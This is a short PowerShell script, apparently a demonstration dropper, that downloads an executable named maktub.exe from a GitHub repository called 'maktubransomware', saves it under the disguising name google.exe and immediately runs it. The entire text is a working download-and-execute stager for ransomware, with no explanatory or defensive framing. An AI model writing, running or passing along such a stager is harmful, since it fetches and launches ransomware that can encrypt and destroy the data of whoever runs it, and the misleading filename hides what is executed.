$down = New-Object System.Net.WebClient
$url  = 'https://github.com/S1Demo/maktubransomware/raw/master/maktub.exe';
$file = 'google.exe';
$down.DownloadFile($url,$file);
$exec = New-Object -com shell.application
$exec.shellexecute($file);